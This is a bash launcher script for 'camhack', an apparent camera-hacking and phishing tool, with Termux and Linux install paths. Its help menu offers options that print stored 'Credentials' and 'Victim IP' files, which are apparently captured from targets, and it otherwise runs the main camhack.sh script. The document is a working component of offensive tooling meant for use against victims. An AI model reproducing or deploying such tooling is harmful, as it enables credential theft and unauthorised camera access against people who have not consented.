#!/bin/bash

# https://github.com/alihaider998/camhack

if [[ $(uname -o) == *'Android'* ]];then
	CAMHACK_ROOT="/data/data/com.termux/files/usr/opt/camhack"
else
	export CAMHACK_ROOT="/opt/camhack"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Camhack type \`camhack\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $CAMHACK_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $CAMHACK_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $CAMHACK_ROOT
	bash ./camhack.sh
fi
